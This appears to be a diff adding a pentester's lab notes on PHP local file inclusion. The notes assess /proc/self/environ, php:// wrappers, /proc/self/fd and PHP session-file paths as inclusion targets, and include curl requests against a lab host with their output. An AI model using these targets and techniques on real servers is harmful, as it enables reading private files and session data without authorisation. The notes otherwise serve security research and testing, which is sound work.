@@ -1,0 +1,95 @@
+ Some good paths:
+ * https://nets.ec/File_Inclusion
+ 
+ 
+ 
+/proc/self/environ
+
+only readable when CoreDumpDirectory has been set in apache config as it disable security protections, see prctl(PR_SET_DUMPABLE), however not used for transfering data
+
+
+probably related to php-fpm when has not been set with dumpable??
+
+
+When php-fpm has the following in its config files (probably per each pool):
+process.dumpable = yes
+
+However, still can not read the environ as its been zero'ed in memory, also a new process is not started for each request.
+
+
+I think only the CGI model would create a new process for each request.
+
+
+
+
+php://fd/8
+
+This wrapper only works in cli mode:
+* https://github.com/php/php-src/commit/df2a38e7f8603f51afa4c2257b3369067817d818
+
+Further, also STREAM_OPEN_FOR_INCLUDE needs to be enabled. Not sure if this is allow_url_include ?
+
+
+
+
+/proc/self/fd/x
+
+The contents of fd are symlinks. So if the web server is configured to allow read access to any of its access logs to the account running, then this can be included.
+* not possible by default in apache
+
+
+
+
+php://stderr
+
+There are no protections in the php code against this, it simply dup's the STDERR fd. However, its really dependent on it called context:
+
+When called from apache:
+$ curl '192.168.56.47:81?dir=/proc/self/fd&content=php://stderr' -so - 
+.                             33     33  40500        0    2020-09-24 20:09:05  
+..                            33     33  40555        0    2020-09-24 19:58:52  
+0                             33     33 120500       64    2020-09-24 20:09:05  /dev/null
+1                             33     33 120300       64    2020-09-24 20:09:05  /dev/null
+2                             33     33 120300       64    2020-09-24 20:09:05  /var/log/apache2/error.log
+...
+<br />
+<b>Notice</b>:  file_get_contents(): read of 8192 bytes failed with errno=9 Bad file descriptor in <b>/var/www/html/index.php</b> on line <b>23</b><br />
+
+Probably fails due to only write access to error log.
+
+From the php-fpm this is already closed:
+$ curl '192.168.56.47:82?dir=/proc/self/fd&content=php://stderr' -so - 
+.                             33     33  40500        0    2020-09-24 20:04:34  
+..                            33     33  40555        0    2020-09-24 20:04:34  
+0                             33     33 120700       64    2020-09-24 20:05:09  /dev/null
+1                             33     33 120700       64    2020-09-24 20:05:09  /dev/null
+2                             33     33 120700       64    2020-09-24 20:05:09  /dev/null
+3                             33     33 120700       64    2020-09-24 20:05:09  /tmp/.ZendSem.Gk8yRy (deleted)
+4                             33     33 120700       64    2020-09-24 20:05:09  socket:[105886]
+5                             33     33 120500       64    2020-09-24 20:05:09  /etc/passwd
+9                             33     33 120700       64    2020-09-24 20:05:09  socket:[87579]
+
+
+However, in principle if a file was opened and assigned to fd 2 before it was called it would be vulnerable.
+
+
+sess_4a3ssdf345gsa34f
+
+This is the most likely LFI vulnerbility as no apache/php level protections are in place
+
+c:\WINDOWS\TEMP\sess_
+c:\php\sessions\sess_
+c:\php5\sessions\sess_
+c:\xampp\tmp\sess_ [default on xampp]
+%temp%\sess_  [could be %userprofile%\appdata\local\temp\, default if not explicitly set]
+
+
+/var/lib/php/sessions/sess_ [debian/ubuntu default]
+/var/lib/php/session/sess_ [centos 8 default]
+/var/lib/phpXX/session/sess_
+/var/lib/php5/sess_
+/tmp/sess_ [default if not explicitly set, e.g. alpine]
+
+
+It appears there are no specific protections against different vhosts leaking session cookies as the php.
+* can be explicitly set with session_save_path in a script
